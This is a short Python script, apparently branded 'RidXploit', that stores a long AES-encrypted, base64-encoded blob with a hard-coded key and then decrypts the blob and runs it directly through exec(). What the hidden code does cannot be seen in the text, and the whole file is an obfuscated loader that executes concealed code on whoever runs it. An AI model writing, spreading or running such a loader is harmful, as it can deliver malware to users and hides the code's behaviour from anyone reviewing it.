# This file has been encrypted using AES and base64 by RidXploit

encrypted_code = "RidXploit_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_RidXploit"
key = bytes.fromhex("01dd0c114355e0bfc7a5d9f7cd8216fe16ca7297121cebc8bd30485c282a9719")


import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def aes_decrypt(data, key):
    data = base64.b64decode(data.replace("RidXploit_", "").replace("_RidXploit", ""))
    iv = data[:16]
    ciphertext = data[16:]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted = unpad(cipher.decrypt(ciphertext), AES.block_size)
    return decrypted

# Decrypt and execute the Python code
decrypted_code = aes_decrypt(encrypted_code, key)
exec(decrypted_code.decode('utf-8'))
